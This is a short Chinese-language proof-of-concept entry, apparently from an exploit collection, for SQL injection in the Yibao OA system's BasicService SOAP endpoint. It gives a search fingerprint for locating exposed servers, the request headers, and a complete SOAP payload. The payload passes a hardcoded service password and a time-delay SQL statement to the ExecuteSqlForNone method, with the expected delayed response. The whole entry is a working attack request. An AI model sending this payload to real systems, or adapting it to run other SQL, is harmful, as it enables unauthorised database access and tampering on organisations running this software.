# 易宝OABasicServiceSQL注入

- **系统**：易宝OABasicService　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="顶讯科技-易宝OA系统"`
- **请求**：`POST /WebService/BasicService.asmx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`SOAPAction: "http://tempuri.org/ExecuteSqlForNone"`　`Content-Length: 85`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<ExecuteSqlForNone xmlns="http://tempuri.org/">
<sql>waitfor delay '0:0:5'--+</sql>
<strParameters></strParameters>
<webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
</ExecuteSqlForNone>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　响应时间>=5s